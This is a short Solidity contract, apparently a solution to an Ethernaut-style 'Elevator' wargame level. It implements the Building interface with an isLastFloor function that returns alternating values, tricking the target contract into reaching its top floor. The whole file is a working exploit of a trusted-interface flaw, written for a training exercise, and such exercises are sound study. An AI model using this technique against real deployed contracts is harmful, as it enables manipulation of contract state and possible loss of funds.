pragma solidity ^0.4.24;

import "./levels/Elevator.sol";

contract ElevatorHack is Building{

    bool public toggle = true;

    function attack(address _instance) public {
        Elevator(_instance).goTo(12);
    }

    // Impl interface recognized from invoker class.
    function isLastFloor(uint) public view returns (bool){
        toggle = !toggle;
        return toggle;
    }
}